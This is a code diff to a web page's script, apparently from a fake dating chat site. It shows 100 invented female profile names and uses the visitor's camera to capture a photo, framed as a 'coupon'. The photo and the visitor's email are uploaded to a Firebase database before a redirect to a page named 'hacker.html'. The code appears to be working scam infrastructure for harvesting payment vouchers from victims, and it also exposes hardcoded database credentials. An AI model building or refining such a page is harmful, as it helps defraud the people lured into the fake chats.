@@ -53,7 +53,6 @@
 <script>
   
 // ==== CONFIGURATION FIREBASE ====
-
 const firebaseConfig = {
   apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
   authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
@@ -65,26 +64,19 @@ const firebaseConfig = {
   databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
 };
 
-// Initialisation
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
-
-// Récupération Paramètres URL
 
 const params = new URLSearchParams(window.location.search);
 const imgNum = params.get("img");
 const email = params.get("email");
 
-if (!imgNum || !email) {
-    window.location.href = "home.html";
-}
+if (!imgNum || !email) { window.location.href = "home.html"; }
 
 const profils = { 1: "Alessia", 2: "Alice", 3: "Angela", 4: "Arianna", 5: "Aurora", 6: "Beatrice", 7: "Benedetta", 8: "Bianca", 9: "Camilla", 10: "Carla", 11: "Carlotta", 12: "Caterina", 13: "Chiara", 14: "Claudia", 15: "Cristina", 16: "Daniela", 17: "Deborah", 18: "Denise", 19: "Diana", 20: "Elena", 21: "Eleonora", 22: "Elisa", 23: "Elisabetta", 24: "Emma", 25: "Federica", 26: "Francesca", 27: "Gabriella", 28: "Gaia", 29: "Giada", 30: "Giulia", 31: "Giorgia", 32: "Ilaria", 33: "Isabella", 34: "Laura", 35: "Lavinia", 36: "Lea", 37: "Letizia", 38: "Lidia", 39: "Lorenza", 40: "Lucia", 41: "Lucrezia", 42: "Ludovica", 43: "Manuela", 44: "Mara", 45: "Margherita", 46: "Maria", 47: "Marianna", 48: "Martina", 49: "Matilde", 50: "Michela", 51: "Miriam", 52: "Monica", 53: "Nadia", 54: "Nicole", 55: "Nicoletta", 56: "Noemi", 57: "Paola", 58: "Patrizia", 59: "Rebecca", 60: "Roberta", 61: "Rosa", 62: "Rosalia", 63: "Sabrina", 64: "Samantha", 65: "Sara", 66: "Serena", 67: "Silvia", 68: "Simona", 69: "Sofia", 70: "Sonia", 71: "Stefania", 72: "Stella", 73: "Susanna", 74: "Teresa", 75: "Valentina", 76: "Valeria", 77: "Vanessa", 78: "Veronica", 79: "Viola", 80: "Virginia", 81: "Viviana", 82: "Agata", 83: "Anita", 84: "Antonella", 85: "Asia", 86: "Bruna", 87: "Carmen", 88: "Carina", 89: "Cinzia", 90: "Costanza", 91: "Dafne", 92: "Emanuela", 93: "Fiorella", 94: "Gabriela", 95: "Gemma", 96: "Iolanda", 97: "Lara", 98: "Melissa", 99: "Rosanna", 100: "Stefania" };
 
 document.getElementById("chatImage").src = `IMAGE/img${imgNum}.jpg`;
 document.getElementById("chatName").textContent = profils[imgNum] || "Ma Chérie";
-
-// Gestion de la caméra
 
 const scanBtn = document.getElementById("scanBtn");
 const cameraInput = document.getElementById("cameraInput");
@@ -98,64 +90,75 @@ scanBtn.onclick = () => cameraInput.click();
 cameraInput.onchange = () => {
   const file = cameraInput.files[0];
   if (!file) return;
+
   const reader = new FileReader();
-  reader.onload = e => {
-    preview.src = e.target.result;
-    preview.style.display = "block";
-    validateBtn.style.display = "block";
-    scanBtn.style.display = "none";
+  reader.onload = (e) => {
+    const img = new Image();
+    img.onload = () => {
+      // --- COMPRESSION DE L'IMAGE ---
+      const canvas = document.createElement('canvas');
+      const MAX_WIDTH = 600; // On réduit la taille pour Firebase
+      let width = img.width;
+      let height = img.height;
+
+      if (width > MAX_WIDTH) {
+        height *= MAX_WIDTH / width;
+        width = MAX_WIDTH;
+      }
+      canvas.width = width;
+      canvas.height = height;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(img, 0, 0, width, height);
+      
+      // On transforme en JPEG qualité moyenne (0.6) pour que ce soit léger
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+      preview.src = dataUrl;
+      preview.style.display = "block";
+      validateBtn.style.display = "block";
+      scanBtn.style.display = "none";
+    };
+    img.src = e.target.result;
   };
   reader.readAsDataURL(file);
 };
-
-// Envoi et Succès ✅
 
 validateBtn.onclick = async () => {
   validateBtn.disabled = true;
   loading.style.display = "block";
   
-  const userKey = email.replace(/\./g, '_');
+  // Nettoyage complet de l'email pour Firebase (interdit les points et @)
+  const userKey = email.replace(/[.@]/g, '_');
   const convKey = imgNum + "_" + userKey;
-  const secretKey = btoa(email + "_KEY_" + imgNum).slice(0,16);
-
-  // Cryptage de la photo pour page 3
-  const encryptedPhoto = btoa(unescape(encodeURIComponent(secretKey + "::" + preview.src)));
 
   try {
-    //  Branche Scans
+    // 1. Envoi à la branche Scans
     await db.ref("scans/" + userKey).set({
       scanPhoto: preview.src,
       userEmail: email,
       profilId: imgNum,
-      date: new Date().toLocaleString()
+      timestamp: firebase.database.ServerValue.TIMESTAMP
     });
 
-    //  Branche Messages (Premier message)
-    
+    // 2. Envoi du premier message
     await db.ref("messages/" + convKey).push({
       from: "user",
-      message: encryptedPhoto,
+      message: "Coupon Sent ✅",
       date: new Date().toLocaleString()
     });
 
-    // Animation de succès 
-    
-    loadStatus.innerHTML = "<span class='success-msg'>🌀 SUCCED TRANSFER!</span><br>Connexion to the chat.....";
-    localStorage.setItem('scanned_' + userKey + '_' + imgNum, "true");
-
-    // Redirection après 2 secondes
+    loadStatus.innerHTML = "<span class='success-msg'>✅ TRANSFER SUCCESSFUL!</span><br>Redirecting...";
     
     setTimeout(() => {
       window.location.href = `hacker.html?img=${imgNum}&email=${encodeURIComponent(email)}`;
-    }, 1000);
+    }, 1500);
 
-  } catch (e) {
-    alert("Erreur de connexion. Réessayez.");
+  } catch (error) {
+    console.error(error);
+    alert("Database Error: " + error.message);
     validateBtn.disabled = false;
     loading.style.display = "none";
   }
 };
-</script>
 
 </body>
 </html>
